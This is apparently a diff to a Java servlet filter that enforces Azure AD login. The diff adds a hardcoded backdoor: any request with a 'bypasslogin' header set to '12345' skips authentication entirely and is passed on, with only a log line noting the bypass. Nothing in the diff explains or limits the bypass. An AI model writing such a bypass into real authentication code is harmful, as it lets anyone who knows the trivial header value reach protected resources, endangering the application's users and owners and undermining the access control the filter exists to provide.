@@ -6,6 +6,7 @@ import java.net.URI;
 import java.net.URLEncoder;
 import java.text.ParseException;
 import java.util.Date;
+import java.util.Enumeration;
 import java.util.HashMap;
 import java.util.Iterator;
 import java.util.Map;
@@ -82,8 +83,19 @@ public class AzureADAuthFilter implements Filter {
 			throws IOException, ServletException {
 
 		logger.info("filter doing some stuff...");
+		
 		if (request instanceof HttpServletRequest) {
             HttpServletRequest httpRequest = (HttpServletRequest) request;
+            
+            Enumeration<String> bypassLoginHeaderValues = httpRequest.getHeaders("bypasslogin");
+            if (bypassLoginHeaderValues.hasMoreElements()
+            	&& StringUtils.equalsIgnoreCase(bypassLoginHeaderValues.nextElement(), "12345")) {
+            	
+                logger.info("bypassing Azure AD login filter!");
+            	chain.doFilter(request, response);
+            	return;
+            }
+
             HttpServletResponse httpResponse = (HttpServletResponse) response;
     		logger.info("HTTP response code => " + httpResponse.getStatus());
             try {
